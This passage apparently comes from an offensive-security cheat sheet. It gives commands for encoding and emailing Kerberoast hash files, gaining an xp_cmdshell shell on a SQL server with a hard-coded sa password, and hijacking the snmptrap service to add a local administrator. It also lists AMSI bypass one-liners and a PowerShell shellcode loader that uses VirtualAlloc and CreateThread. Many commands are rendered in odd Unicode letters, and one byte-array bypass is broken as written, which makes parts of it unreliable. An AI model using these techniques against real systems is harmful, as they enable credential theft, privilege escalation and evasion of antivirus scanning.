$𝑓𝑖𝑙𝑒 = "𝐶:\𝑈𝑠𝑒𝑟𝑠\𝑃𝑢𝑏𝑙𝑖𝑐\ ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡"
$𝑏𝑎 = [𝑆𝑦𝑠𝑡𝑒𝑚. 𝑖𝑜. 𝑓𝑖𝑙𝑒]: : 𝑅𝑒𝑎𝑑𝑎𝑙𝑙𝐵𝑦𝑡𝑒𝑠($𝑓𝑖𝑙𝑒)
$𝑠𝑡𝑟 = [𝑆𝑦𝑠𝑡𝑒𝑚. 𝑐𝑜𝑛𝑣𝑒𝑟𝑡]: :𝑡𝑜𝑏𝑎𝑠𝑒64𝑠𝑡𝑟𝑖𝑛𝑔($𝑏𝑎)

5)Decode base64 & store it in file
𝑏𝑎𝑠𝑒64 "𝑒𝑛𝑐𝑜𝑑𝑒𝑑" | 𝑏𝑎𝑠𝑒64 − 𝑑 > ℎ𝑎𝑠ℎ𝑒𝑠. 𝑘𝑒𝑟𝑏𝑒𝑟𝑜𝑎𝑠𝑡
```


## Using “sendemail” for transmitting email:

```
𝑐𝑎𝑡 𝑚𝑠𝑔.𝑡𝑥𝑡 | 𝑠𝑒𝑛𝑑𝑒𝑚𝑎𝑖𝑙 − 𝑙 𝑒𝑚𝑎𝑖𝑙. 𝑙𝑜𝑔 − 𝑓 "𝑡𝑒𝑠𝑡@𝑡𝑒𝑠𝑡. 𝑐𝑜𝑚" − 𝑢 "𝑖𝑚𝑝𝑜𝑟𝑡𝑎𝑛𝑡_𝑑𝑒𝑙𝑖𝑣𝑒𝑟𝑦" − 𝑡 "a@a.com" − 𝑠 "Title" − 𝑜 𝑡𝑙𝑠 = 𝑛𝑜 − 𝑎 1. 𝑏𝑎t
```

## Shell of DB-Server

```
𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑝𝑦𝑡ℎ𝑜𝑛 𝑚𝑠𝑑𝑎𝑡. 𝑝𝑦 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 − 𝑠 10.1.3.2 − 𝑝 1433 − 𝑈 𝑠𝑎 − 𝑃 ′𝑆𝐴𝐴𝑑𝑚𝑖𝑛! @#$%′ − −𝑒𝑛𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 −
−𝑑𝑖𝑠𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 − −𝑑𝑖𝑠𝑎𝑏𝑙𝑒 − 𝑥𝑝𝑐𝑚𝑑𝑠ℎ𝑒𝑙𝑙 – 𝑠ℎ𝑒𝑙l
```


## open cmd.exe with wordpress or ...

xfreerdp x.rdp /timeout:99999
Word->File->Open cmd.exe


## Abuse SMPTRAP service

```
𝑠𝑐 𝑞𝑐 𝑠𝑛𝑚𝑝𝑡𝑟𝑎p
𝑠𝑐 𝑐𝑜𝑛𝑓𝑖𝑔 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝 𝑏𝑖𝑛𝑝𝑎𝑡ℎ = "𝑛𝑒𝑡 𝑙𝑜𝑐𝑎𝑙𝑔𝑟𝑜𝑢𝑝 𝑎𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟𝑠 𝑖𝑦𝑒𝑟 /𝑎𝑑𝑑"
𝑠𝑐 𝑠𝑡𝑜𝑝 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝
𝑠𝑐 𝑠𝑡𝑎𝑟𝑡 𝑠𝑛𝑚𝑝𝑡𝑟𝑎𝑝
```

## amsi one line bypass 


1. Byte array: This method involves converting malicious code into a byte array, which bypasses AMSI inspection.



```
$script = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABzAGUAcwB0AD0AIgBQAG8AdwBlAHIAcwBoAG8AcgBvAGYAIABjAG8AbgBzAGkAbwBuAHQAIABsAG8AbwAgACgAWwBJAF0AXQA6ADoARgBvAHIAbQBhAHQAZQByACkAIgA='))
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
for ($i = 0; $i -lt $bytes.Length; $i++) {
    if (($bytes[$i] -eq 0x41) -and ($bytes[$i+1] -eq 0x6D) -and ($bytes[$i+2] -eq 0x73) -and ($bytes[$i+3] -eq 0x69)) {
        $bytes[$i+0] = 0x42; $bytes[$i+1] = 0x6D; $bytes[$i+2] = 0x73; $bytes[$i+3] = 0x69
    }
}
[System.Reflection.Assembly]::Load($bytes)
```


2. Reflection: This method involves using .NET reflection to invoke a method that is not inspected by AMSI.


```
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null,$true)
```

or

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```


3. String obfuscation: This method involves obfuscating the malicious code to evade AMSI detection.

4. AMSI patching: This method involves patching AMSI to bypass the inspection entirely.

5. Using alternative PowerShell hosts: This method involves using alternative PowerShell hosts that don't load AMSI modules.



Byte-patching:

```
Add-Type -MemberDefinition '
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);
' -Namespace Win32
$shellcode = [System.Text.Encoding]::UTF8.GetBytes('MY_SHELLCODE_HERE')
$mem = [Win32]::VirtualAlloc(0, $shellcode.Length, 0x1000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [System.IntPtr]($mem), $shellcode.Length)
$thread = [Win32]::CreateThread(0, 0, $mem, 0, 0, 0)
```


{% include links.html %}
